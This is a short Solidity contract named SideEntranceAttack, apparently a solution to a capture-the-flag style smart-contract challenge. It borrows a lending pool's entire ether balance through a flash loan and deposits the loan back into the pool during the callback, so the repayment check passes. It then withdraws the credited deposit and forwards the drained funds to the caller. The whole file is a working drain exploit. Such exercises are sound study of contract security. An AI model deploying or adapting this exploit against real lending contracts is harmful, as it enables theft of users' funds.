// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";


contract SideEntranceAttack {
    SideEntranceLenderPool private victimContract;

    constructor (address _victimContractAddress) {
        victimContract = SideEntranceLenderPool(_victimContractAddress);
    }

    function start() public {
        victimContract.flashLoan(address(victimContract).balance);
    }
    
    function execute() external payable {
        victimContract.deposit{value: msg.value}();
    }

    function end() public {
        victimContract.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}